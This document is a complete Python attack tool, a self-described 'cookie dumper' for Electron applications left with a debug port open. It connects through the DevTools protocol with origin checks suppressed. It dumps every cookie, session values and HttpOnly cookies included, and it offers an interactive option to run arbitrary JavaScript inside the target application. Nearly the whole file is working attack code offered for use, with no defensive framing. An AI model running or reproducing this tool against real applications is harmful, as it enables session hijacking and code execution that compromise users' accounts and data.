#!/usr/bin/env python3
"""
Cookie dumper for Electron apps with debug port enabled
Usage: python3 cookie-dumper.py [port]
Default port: 9229
"""

import websocket
import json
import sys
import time

def get_debugger_url(port):
    """Get the WebSocket debugger URL from the JSON endpoint"""
    import urllib.request
    
    try:
        url = f"http://127.0.0.1:{port}/json"
        with urllib.request.urlopen(url, timeout=5) as response:
            data = json.loads(response.read().decode())
            if data and len(data) > 0:
                return data[0].get("webSocketDebuggerUrl")
    except Exception as e:
        print(f"Error fetching debugger URL: {e}")
    return None

def dump_cookies(port=9229):
    """Dump cookies from Electron app"""
    print(f"[*] Connecting to debug port {port}...")
    
    ws_url = get_debugger_url(port)
    if not ws_url:
        print(f"[!] Could not get debugger URL from port {port}")
        print("[!] Make sure the Electron app is running with --inspect or --remote-debugging-port")
        return
    
    print(f"[*] WebSocket URL: {ws_url}")
    
    try:
        ws = websocket.WebSocket()
        ws.connect(ws_url, suppress_origin=True)
        
        # Get all cookies
        ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
        response = json.loads(ws.recv())
        
        if "result" in response:
            cookies = response["result"]["value"]
            print(f"\n[*] Found {len(cookies)} cookies:\n")
            
            for cookie in cookies:
                print(f"Domain: {cookie.get('domain', 'N/A')}")
                print(f"Name: {cookie.get('name', 'N/A')}")
                print(f"Value: {cookie.get('value', 'N/A')}")
                print(f"Path: {cookie.get('path', 'N/A')}")
                print(f"Secure: {cookie.get('secure', False)}")
                print(f"HttpOnly: {cookie.get('httpOnly', False)}")
                print("-" * 40)
        else:
            print("[!] No cookies found or error in response")
            print(f"Response: {response}")
        
        ws.close()
        
    except Exception as e:
        print(f"[!] Error: {e}")

def execute_js(port=9229, js_code=""):
    """Execute JavaScript in the Electron app"""
    if not js_code:
        js_code = input("Enter JavaScript to execute: ")
    
    print(f"[*] Connecting to debug port {port}...")
    
    ws_url = get_debugger_url(port)
    if not ws_url:
        print(f"[!] Could not get debugger URL from port {port}")
        return
    
    try:
        ws = websocket.WebSocket()
        ws.connect(ws_url, suppress_origin=True)
        
        # Enable runtime
        ws.send(json.dumps({"id": 1, "method": "Runtime.enable"}))
        ws.recv()
        
        # Execute code
        ws.send(json.dumps({
            "id": 2,
            "method": "Runtime.evaluate",
            "params": {
                "expression": js_code,
                "returnByValue": True
            }
        }))
        
        response = json.loads(ws.recv())
        print(f"\n[*] Result: {json.dumps(response, indent=2)}")
        
        ws.close()
        
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    else:
        port = 9229
    
    print("=== Electron Cookie Dumper ===")
    print(f"Target port: {port}")
    print("")
    print("Commands:")
    print("  1. Dump cookies")
    print("  2. Execute JavaScript")
    print("  3. Exit")
    print("")
    
    while True:
        choice = input("Select option (1-3): ").strip()
        
        if choice == "1":
            dump_cookies(port)
        elif choice == "2":
            js = input("Enter JavaScript: ")
            execute_js(port, js)
        elif choice == "3":
            print("Exiting...")
            break
        else:
            print("Invalid option")
